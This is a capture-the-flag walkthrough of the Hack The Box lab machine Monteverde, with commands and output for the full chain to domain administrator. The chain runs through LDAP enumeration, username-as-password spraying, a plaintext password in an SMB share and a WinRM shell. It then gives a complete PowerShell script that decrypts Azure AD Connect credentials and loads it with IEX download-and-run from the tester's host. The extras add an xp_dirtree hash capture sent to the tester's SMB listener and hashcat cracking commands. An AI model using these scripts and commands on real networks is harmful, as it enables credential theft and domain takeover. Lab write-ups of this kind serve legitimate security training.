# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.10.172
nmap -sU --top-ports=10 -vv 10.10.10.172

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-22 17:54:33Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-22T17:54:37
|_  start_date: N/A
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 2859/tcp): CLEAN (Timeout)
|   Check 2 (port 14316/tcp): CLEAN (Timeout)
|   Check 3 (port 47166/udp): CLEAN (Timeout)
|   Check 4 (port 63665/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
	- Domain : megabank.local
	- smb, rpc, ldap, kerberos, 
----
## SMB Enumeration
- Don't get anything with null, guest and anonymous authentication
---
## LDAPsearch
- Performing LDAP anonymous authentication:
	```bash
ldapsearch -x -H ldap://10.10.10.172 -s base namingcontexts

---OUTPUT---
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
- Then using the DC information I query LDAP:
	```bash
ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local"
ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local" | grep "Password" #grep "password"
ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local" | grep "sAMAccountName"
--MAIN--
ldapsearch -x -H ldap://10.10.10.172 -b "DC=megabank,DC=local" '(ObjectClass=user)' sAMAccountName | grep "sAMAccountName" > ldapuser
cat ldapuser | awk -F: '{print $2}' | awk '{print $1}' > fixedldapuser
# I use awk twice to remove the space..
cat fixedldapuser

---OUTPUT-CAT---
sAMAccountName
Guest
MONTEVERDE$
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
	- Should note I also saw that user SABatchJobs had a badpassword value which wasn't 0 ( using the grep "password" -A10 -B10 command)

- I then use crackmapexec to spray each user with its own username as password:
	```bash
crackmapexec smb 10.10.10.172 -u fixedldapuser -p fixedldapuser --no-bruteforce

---OUTPUT---
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\sAMAccountName:sAMAccountName STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\MONTEVERDE$:MONTEVERDE$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```
	- We get a hit for SABatchJobs
- We check shares :
	```bash
crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares

---OUTPUT---
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated shares
SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ            
```
	- 3 non default shares:
		- azure_uploads
		- E$
		- users$
- I access users$
	```bash
smbclient -U 'SABatchJobs' //10.10.10.172/users$ --password='SABatchJobs'
smb: \> cd mhope\
smb: \mhope\> dir
smb: \mhope\> get azure.xml

---OUTPUT-DIR-MHOPE---
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

```
- azure_uploads share has nothing
- We read azure.xml
	```xml
cat azure.xml

---OUTPUT---
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs> 
```
	- We get a password  `4n0therD4y@n0th3r$`
- As it's spraying I don't check for password lockout policy..although to be fair we can guess which user as we grabbed this file from a directory called mhope in a share called users.
- Spray the password with our known users:
	- crackmapexec/netexec
		```bash
crackmapexec winrm 10.10.10.172 -u fixedldapuser -p 4n0therD4y@n0th3r$

---RELEVANT-OUTPUT---
WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```
- We evil-winrm into the target with these credentials:
	```bash
evil-winrm -u 'mhope' -p '4n0therD4y@n0th3r$' -i 10.10.10.172

---OUTPUT---
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
```
	- We can grab the user flag
- upload winPEASany.exe
	```bash
---JUST-WHAT-CAUGHT-MY-EYE---
ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                                                                                                                                        
    C:\Users\mhope\.azure\TokenCache.dat (Azure Token Cache)
    Accessed:1/3/2020 5:36:14 AM -- Size:7896                                                                                                                                                                     

    C:\Users\mhope\.azure\AzureRMContext.json (Azure RM Context)
    Accessed:1/3/2020 5:35:57 AM -- Size:2794

-------------------------------------------------------------------------------
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                                                                                                                                        
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

```
- If we check Program Files we see AD Sync and if we google `azure "ADSync" privilege escalation` we find this in the second link
	- https://blog.xpnsec.com/azuread-connect-for-redteam/
	```bash
*Evil-WinRM* PS C:\Program Files> dir

---RELEVANT-OUTPUT---
    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync **
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
```
- We also see our user is part of Azure Admins group
	```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync> net user mhope

---OUTPUT---
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   4/22/2025 12:27:15 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```
	- This would give us access to the azure database
- From the link above, under PSH we see a code that can retrieve the plaintext password.
- We copy it to a file decrypt.ps1 and import it via IEX
	```bash
cat decrypt.ps1

---OUTPUT---

|$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"|
|$client.Open()|
|$cmd = $client.CreateCommand()|

|$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"|
|$reader = $cmd.ExecuteReader()|
|$reader.Read() \| Out-Null|
|$key_id = $reader.GetInt32(0)|
|$instance_id = $reader.GetGuid(1)|
|$entropy = $reader.GetGuid(2)|
|$reader.Close()|
|$cmd = $client.CreateCommand()|
|$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"|
|$reader = $cmd.ExecuteReader()|
|$reader.Read() \| Out-Null|
|$config = $reader.GetString(0)|
|$crypted = $reader.GetString(1)|
|$reader.Close()|
|add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'|
|$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager|
|$km.LoadKeySet($entropy, $instance_id, $key_id)|
|$key = $null|
|$km.GetActiveCredentialKey([ref]$key)|
|$key2 = $null|
|$km.GetKey(1, [ref]$key2)|
|$decrypted = $null|
|$key2.DecryptBase64ToString($crypted, [ref]$decrypted)|
|$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" \| select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}|
|$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" \| select @{Name = 'Username'; Expression = {$_.node.InnerXML}}|
|$password = select-xml -Content $decrypted -XPath "//attribute" \| select @{Name = 'Password'; Expression = {$_.node.InnerText}}|
|Write-Host ("Domain: " + $domain.Domain)|
|Write-Host ("Username: " + $username.Username)|
Write-Host ("Password: " + $password.Password)
```
	- Opens database, gets keyset_id, instance_id, entropy FROM mms_server_configuration
		- Can run these commands on sqlcmd (shown at bottom of notes)
	- Assigning each of them to a variable and we clode the reader
	- Then we run a second command to get  private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'
	- After which it calls mcrypt.dll, calls LoadKeySet. GetActiveCredentialKey and DecryptBase64ToString functions to decrypt the password.
- Uploading via IEX:
	```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/decrypt.ps1')

---OUTPUT-ERROR--- 
Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: <f:WSManFault Code='1726' Machine='10.10.10.172' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'>                                                                                                           <f:Message>The WSMan provider host process did not return a proper response.  A provider in the host pr                                                                                                           ocess may have behaved improperly. </f:Message></f:WSManFault>                                  

Error: Exiting with code 
```
- Trying to identify the error:
	- We pass these commands one by one onto the target powershell:
		```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> $client.Open()

---OUTPUT-ERROR---
Exception calling "Open" with "0" argument(s): "A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)"
At line:1 char:1
+ $client.Open()
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : SqlException


```
		- The shell gets stuck here. and eventually returns an error The error probably lies in opening connection to SQL
			- but our database is local..so maybe a better command should work
			- Changing the Data Source to localhost
				```bash
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=localhost\.\ADSync;Initial Catalog=ADSync"
```
	- It fails
- I search online for this string " Data Source=(localdb)"
	- Showed me a microsoft link to SQL talking about SQL Connection String
- I then searched for SQL Connection String alternative and came across this link:
	- https://www.connectionstrings.com/sql-server/
		- I found a command that could work and replaced the command argument with this :
			```bash
"Server=localhost;Database=ADSync;Trusted_Connection=True;"
```
			- On checking on the target powershell the connection could be opened. 
- I then edited decrypt.ps1 and replaced the first command with this argument (alternatively I saw Ippsec's video and he used another argument which took reference from this link : https://mcpmag.com/articles/2018/12/10/test-sql-connection-with-powershell.aspx)
	- Fixing decrypt.ps1
		```bash
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList “Server=LocalHost;Database=ADSync;Trusted_Connection=True;”
--OR-IPPSEC-
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost;Integrated Security=true;Initial Catalog=ADSync"
```
- I then again loaded the file using IEX on target powershell:
	```bash
-----
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:80/decrypt.ps1')
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```
	- We get domain password.
## Alternate method
- The walkthrough also talks of another way to exploit
	- Directed me to this repo: https://github.com/VbScrub/AdSyncDecrypt/releases
		- unzipped it on my local machine and uploaded it to target
			```bash
unzip AdDecrpt.zip
```
			- As documentation states, make sure the dll files and exe are in the same directory and our current directory must be `C:\Program Files\Microsoft Azure AD Sync\Bin`
				```bash
cd C:\Users\mhope\Documents
upload AdDecrypt.exe
upload mcrypt.dll
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
```
- We can then execute the command with `-FullSQL` argument to retrieve the password:
	```bash
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL

---OUTPUT---
======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```
	-  We get admin password
-------
--------
## Extras
- Can grab the mcrypt.dll files (as that's the file that is used to grab the creds) and analyze it using DnSpy on windows
	- There we can see the functions that the commands in our code (decrypt.ps1) calls
- **SQLCMD** seems to work (we can see it running is we pass `ps` command or if we saw it in the ldapsearch dump)
	```bash
# To see all commands we can run
sqlcmd -?

---OUTPUT---
Microsoft (R) SQL Server Command Line Tool                                                             
Version 14.0.2027.2 NT                                                                                 
Copyright (C) 2017 Microsoft Corporation. All rights reserved.                                         

usage: Sqlcmd            [-U login id]          [-P password]
  [-S server]            [-H hostname]          [-E trusted connection]
  [-N Encrypt Connection][-C Trust Server Certificate]
  [-d use database name] [-l login timeout]     [-t query timeout]
  [-h headers]           [-s colseparator]      [-w screen width]
  [-a packetsize]        [-e echo input]        [-I Enable Quoted Identifiers]
  [-c cmdend]            [-L[c] list servers[clean output]]
  [-q "cmdline query"]   [-Q "cmdline query" and exit]
  [-m errorlevel]        [-V severitylevel]     [-W remove trailing spaces]
  [-u unicode output]    [-r[0|1] msgs to stderr]
  [-i inputfile]         [-o outputfile]        [-z new password]
  [-f <codepage> | i:<codepage>[,o:<codepage>]] [-Z new password and exit]
  [-k[1|2] remove[replace] control characters]
  [-y variable length type display width]
  [-Y fixed length type display width]
  [-p[1] print statistics[colon format]]
  [-R use client regional setting]
  [-K application intent]
  [-M multisubnet failover]
  [-b On error batch abort]
  [-v var = "value"...]  [-A dedicated admin connection]
  [-X[1] disable commands, startup script, environment variables [and exit]]
  [-x disable variable substitution]
  [-j Print raw error messages]
  [-g enable column encryption]
  [-G use Azure Active Directory for authentication]
  [-? show syntax summary]
```
	- `-Q` for a command line query
		```bash
sqlcmd -Q "select * from sys.databases"

---OUTPUT---
name                                                                                                                             database_id source_database_id owner_sid                                                                                                                                                                    create_date             compatibility_level collation_name                                                                                                                   user_access user_access_desc                                             is_read_only is_auto_close_on is_auto_shrink_on state state_desc                                                   is_in_standby is_cleanly_shutdown is_supplemental_logging_enabled snapshot_isolation_state snapshot_isolation_state_desc                                is_read_committed_snapshot_on recovery_model recovery_model_desc                                          page_verify_option page_verify_option_desc                   
...
..
...
..
```
		- Gives a big output but not really readable. we do see id's, database name etc in the top
	- Then pass:
		```bash
sqlcmd -Q "select name,create_date from sys.databases"

---OUTPUT---
                          create_date
-------------------------------------------------------------------------------------------------------------------------------- -----------------------
master                                                                                                                           2003-04-08 09:13:36.390
tempdb                                                                                                                           2025-04-22 10:45:06.120
model                                                                                                                            2003-04-08 09:13:36.390
msdb                                                                                                                             2017-08-22 19:39:22.887
ADSync                                                                                                                           2020-01-02 14:53:29.783

(5 rows affected)

```
		- We see ADSync database was created in 2020 which is probably related to our ctf
	- Alternatively we can use PowerUpSQL if we aren't too good with mssql commands:
		- https://github.com/NetSPI/PowerUpSQL
			- for commands  : https://www.netspi.com/blog/technical-blog/network-pentesting/powerupsql-powershell-toolkit-attacking-sql-server/ OR https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
			- We clone it and import the module in target with IEX (while having http server running on directory with PowerUpSQL.ps1)
				```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:80/PowerUpSQL.ps1')
```
		- We pass the command (Fails):
			```bash
 Get-SQLInstanceLocal -Verbose
---OUTPUT-FAIL---
Access denied 
At line:14737 char:24
+         $SqlServices = Get-WmiObject -Class win32_service |
+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand
```
		- We then try:
			```bash
Invoke-SQLAudit -Verbose

---RELEVANT-OUTPUT---
ComputerName  : MONTEVERDE
Instance      : MONTEVERDE
Vulnerability : Excessive Privilege - Execute xp_dirtree
Description   : xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote
                attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or
                managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.
Remediation   : Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public
Severity      : Medium
IsVulnerable  : Yes
IsExploitable : Yes
Exploited     : No
ExploitCmd    : Crack the password hash offline or relay it to another system.
Details       : The public principal has EXECUTE privileges on the xp_dirtree procedure in the master database.
Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/
Author        : Scott Sutherland (@_nullbind), NetSPI 2016

```
	- Basically like winPEAS for mssql
	- We see we can use xp_dirtree
- We listen with responder on our interface and when we pass the next command we get a hash:
	```bash
sudo responder -i tun0

---RELEVANT-OUTPUT---
+] Listening for events...                                                                            

[SMB] NTLMv2-SSP Client   : 10.10.10.172
[SMB] NTLMv2-SSP Username : MEGABANK\MONTEVERDE$
[SMB] NTLMv2-SSP Hash     : MONTEVERDE$::MEGABANK:1e38fe8926911560:0584BED3E3468DC87D081A4A8ACC0A8D:0101000000000000001E4C61C1B3DB0176822D3AF222D4A40000000002000800540057003200450001001E00570049004E002D0057005800360058004C0044005700540042004C00490004003400570049004E002D0057005800360058004C0044005700540042004C0049002E0054005700320045002E004C004F00430041004C000300140054005700320045002E004C004F00430041004C000500140054005700320045002E004C004F00430041004C0007000800001E4C61C1B3DB01060004000200000008003000300000000000000000000000003000007D98B4C2F3D33BC27F34728630265565DFDC5CDD31415703C9F0E5422552AB460A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000                                                                                                
[*] Skipping previously captured hash for MEGABANK\MONTEVERDE$
[*] Skipping previously captured hash for MEGABANK\MONTEVERDE$
```
	- We pass the command:
		```bash
sqlcmd -Q "xp_dirtree '\\10.10.14.25\test'"
```
	- We can attempt to crack it with hashcat but it will fail (it's a machine account so password is complex):
		```bash
hashcat -m 5600 monteverde.hash /usr/share/wordlists/rockyou.txt -r rules/base64.rule
hashcat -m 5600 monteverde.hash /usr/share/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
```

	- Using SQLCMD Ippsec tried to use xp_cmdshell and hsot an smbshare to grab an NTHash but since its a machine account it's very unlikely it could be cracked.
		- Nevertheless a lot of the commands explain what decrypt.ps1 code is doing like the Database we look in etc.
- The user AAD_987d7f2f57d2 is an AD sync thing sync thing to sync pwds between Azure and on premise DC
- Check password policy 
	```bash
crackmapexec smb 10.10.10.172 --pas-pol
```
- Instead of using smbclient we can use smbmap to enumerate and download our azure.xml file
	```bash
smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -R # List all files in all directories
smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 --download users4/mhope/azure.xml
```
- Regarding the decrypt.ps1 code:
	- - With sqlcmd we can also check the data in these databases:
	- test
		```bash
sqlcmd -Q "Use ADSync; select keyset_id, instance_id, entropy FROM mms_server_configuration"

---OUTPUT---
Changed database context to 'ADSync'.
keyset_id   instance_id                          entropy
----------- ------------------------------------ ------------------------------------
          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD

(1 rows affected)
```
		- Probably entopy is a salt? decryption requires static key + salt which is entropy and is why we are grabbing it in the code
	- We then pass:
		```bash
sqlcmd -Q "Use ADSync; SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"

---OUTPUT---
Changed database context to 'ADSync'.
private_configuration_xml                                                                                                                                                                                                                                        encrypted_configuration
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

(1 rows affected)
```

- **Whats actually happening**
	- the code decrypt.ps1 is grabbing the following 2 commands data.
		```bash
sqlcmd -Q "Use ADSync; select private_configuration_xml FROM
mms_management_agent"

---OUTPUT---
Changed database context to 'ADSync'.
private_configuration_xml
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<MAConfig>
      <primary_class_mappings>
        <mapping>
          <primary_class>contact</primary_class>
          <oc-value>contact</oc-value>
        </mapping>
        <mapping>
          <primary_class>device</primary_class>
          <oc-v
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL

(2 rows affected)
```
	- Can also see encrypted data as well:
		```bash
sqlcmd -Q "Use ADSync; select private_configuration_xml,encrypted_configuration FROM mms_management_agent"
---OUTPUT---
Changed database context to 'ADSync'.
private_configuration_xml                                                                                                                                                                                                                                        encrypted_configuration
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<MAConfig>
      <primary_class_mappings>
        <mapping>
          <primary_class>contact</primary_class>
          <oc-value>contact</oc-value>
        </mapping>
        <mapping>
          <primary_class>device</primary_class>
          <oc-v 8AAAAAgAAACfn4Lemwuy/a+hBmbvJMeKVf/3ScxlxjHq9eM7Gjy2YLrrsqeRUZh51ks9Dt6BFTSd8OdCHG209rYsFX6f5Az4ZdpscNYSncIaEaI4Re4qw4vNPSIb3DXX6FDtfQHF97fVDV6wp4e3XTni1Y/DEATO+fgJuveCSDf+lX0UNnQEGrTfdDY9sK5neJ5vquLr0pdobAI6vU2g55IrwahGfKmwFjWF5q+qJ3zGR1nfxgsc0xRUNY2xWKoz
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g

(2 rows affected)

```
		- Also shows encrypted password ( can base64 -d | xxd it to see it's unreadable)
	- So the code basically calls this and then uses mcrypt.dll internal commands to decrypt.
		- Probably encrypted with a static string (as that's what orgs usually like doing) as AzureAD needs to be able to decrypt it
- Ippsec does some extra enumeration analyzing mcrypt.dll with mcrypt.dll and then used DNSZone to check IP which was interesting to watch and learn even if just to see the thought process.
	- the dnszone is useful if you want to see the dns records to find all hostnames of the zone.